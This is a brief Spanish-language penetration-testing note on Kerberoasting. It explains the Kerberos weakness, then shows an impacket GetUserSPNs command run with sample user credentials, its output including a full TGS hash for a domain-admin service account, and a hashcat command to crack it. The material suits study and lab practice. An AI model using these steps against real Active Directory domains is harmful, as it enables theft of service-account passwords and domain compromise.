# Kerberoasting

Debido a que Kerberos se encarga de la autenticación de los clientes a un servicio y no de si pueden acceder o no (De esto se encarga el PAC), cualquier cliente del controlador de dominio puede hacer una petición de un **TGS** de manera arbitraria a cualquier servicio especificando un SPN. Por lo que si se cuenta con credenciales válidas de un usuario podremos tener un TGS de cada cuenta que este corriendo este servicio, y debido a que en los TGS el KDC encripta información con la contraseña del servicio es posible tratar de obtenerla a través de fuerza bruta.



### Explotación&#x20;

Listar SPN y obtener TGS de los servicios del DC con credenciales de un usuario con **impacket**

```bash
impacket-GetUserSPNs -request gerarcorp.local/wdaniel:Password2   

*---------------------------------------------------------------------*         
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName                             Name            MemberOf                                               PasswordLastSet             LastLogon  Delegation 
-----------------------------------------------  --------------  -----------------------------------------------------  --------------------------  ---------  ----------
DC-Company/SVC_SQLService.gerarcorp.local:60111  SVC_SQLService  CN=Admins. del dominio,CN=Users,DC=gerarcorp,DC=local  2023-02-13 16:26:29.549114  <never>               


$krb5tgs$23$*SVC_SQLService$GERARCORP.LOCAL$gerarcorp.local/SVC_SQLService*$86b5b394fa2fc85bd6ce176541c7cd35$785fcee2e1434e3ee190d89765b68ee5481e66e6674ef93a0702a4febfcc9d4f69ac3ca168f3939a5f31cc692c63ba7e5949f0730d0d50c759c8879f643c1775f22ec9f2e7c67a34a758180821533b070c95f1190d23ac43500d05d1c79805b2ed428a9eccb14d8273253054c9770de27681cb89041c03532cea318100c64d5bf982436596a1f2102687f119695db28b68052329536dfa2584d0d1bfd053bd62a326ce1d157e56b4c68787460b1dace513c54fc3490d86d74cdddaaeb5d66ef289b5521fca20dfa21266e518a43a5fb235cd8dcec6e5a81124f0884d23050d6dedc60b359699f3098999de401ad62ef2ed74b2dada61655601d90acc5a2219563e2aad3241d1dbd42ebd7b8f292d3fee2c47be285a69bba425079dbca675f05705fdd3510f26d3d972b94ed46a8b3d4286f46be2f42fbf73b947c26b0a7b43d7c63c58182e627f77ef1a14354bbe1711affa99a62963339d326fc5d6144173b5b7c361059473720d662e584caad45031a67b60297f421676fdceeba7ac1527de86ae667aa115b04ebc4510f91bc8d0f011fb792f3432ccccf46d4fe9f9820c2848d27dad26bdebbb8c596ac44fde74c0f80dc9eb266c92f1a3215956c4e3a454c5ea6b655c2aebfbca34b61742d1fd5598dbce7bf57e7924bbed2579fe509c0b39f13fbadb4a39166f55978a1f7ebb7fb8bf23125c95424a9196d0f68307ea9143365bfac593c6ea929fc06f6967fc734681d914b7dc613ee8dee85321ccb9240a56f3f0360700a1007f92bf2b8d06ed4e8fc6383e893e4c3094ee60bec7ac2ce2a8cd3088f40f93b5bb96433766433a759904ebf8a3c2d6b1b89fddd44da661f24f55a32751c9000557046408ec946e89c4bca093fedc94f543056ec662405ca1cf7c531952807fc93a0b3a09c5d498c352b4a6c4bfc079ff6441fca4545e97b7ba8ce7d6f4c7d53d014a1fa1ac881ff3d8f505b7e0452f10ac666abc693a2c31be396d9d3045a81ab8453e069e77b16be1231492c80587cc7d8079f9f922a6917786d28b26c5088e4204df828e4645ba8adb751724bbd065f6106d3f4dadad4598d6cda21a3820f7b760770554415f99f613d6c8bdfaadb947d742a238c8a983add008b4d5379a51420fd6ec8e23521d1f896fbb652816234689dac7f76e04cd8b04109211d150333cedacd1e4efab1ec5c1c315595d69429aebe209c4ac0901ecc2b542deefe96b786df5ee24dc2faea2f33a6f0d3f08e3e10ead1eb8e0f7f7b68f6bcc88bca45c3adeb31b9b378f5fd003b4deee26883a32c95c95d0cea8daf3d220e4960a177d1924fdb6719e0c8d43a039934683edf9a42b30d6e6941b26fbb9766041ee

```

Crackear con hashcat el TGS

```bash
hashcat -m 13100 -a 0 hash.txt wordlist.txt
```

**-m:** Kerberos 5, etype 23, TGS-REP

**-a 0:** Wordlist | $P$ | hashcat -a 0 -m 400 example400.hash example.dict



